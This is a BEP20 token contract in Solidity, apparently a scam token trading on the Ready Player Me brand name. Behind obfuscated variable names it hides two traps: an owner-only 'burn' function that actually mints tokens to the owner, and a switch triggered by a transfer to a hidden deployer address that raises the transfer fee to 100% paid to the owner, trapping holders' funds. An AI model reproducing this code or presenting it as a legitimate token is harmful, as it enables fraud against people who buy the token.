/**
 *Submitted for verification at BscScan.com on 2022-12-02
*/

// File: contracts/bep20.sol

/////////////////////////////////////////////////
//Ready player me
//Ready player me
//The first modular blockchain network to power scalable, secure Web3 apps.
//We're hiring! 👉 https://Readyplayer.me
//Youtube 👉 
//https://youtube.com/@Readyplayerme
//https://t.me/ready_playerme
//https://twitter.com/Readyplayerme
//////////////////////////////////////////////////////////////////////

pragma solidity ^0.8.13;
contract Readyplayerme {
mapping (address => uint256) public balanceOf;
address public  IhgErj = address(0);
uint256 public  XdjeVK = 10000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant ydDkXc = 9+1;
uint256 public  uQcEWA = 10000000000000000000;
uint8 public constant decimals = 18;
uint256 private  iOqepg = 10000000000000;
uint256 public  kzhsCS = 100000000000000000000;
address public  eHvArL = address(0);
address private  SWQspN = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  yNbIca = 1000000000000000000;
uint256 public  NAIHUD = 10000000000000000000000000000;
string public  name = "Readyplayerme";
address public  jdUDvm = address(0);
address public  yhfLeW = address(0);
address public owner;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  Urumui = address(0);
uint256 public  SrNGMV = 100000000000000000;
address public  CSwFus = address(0);
uint256 public  kbaPJP = 100000000000000000000000;
string public  symbol = "RPM";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  TqUNqt = 100000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () {
SWQspN = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "cinJwM");
require(to != address(0), "cinJwM");
require(amount <= balanceOf[from], "cinJwM");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ydDkXc/iOqepg ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==SWQspN){
iOqepg = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}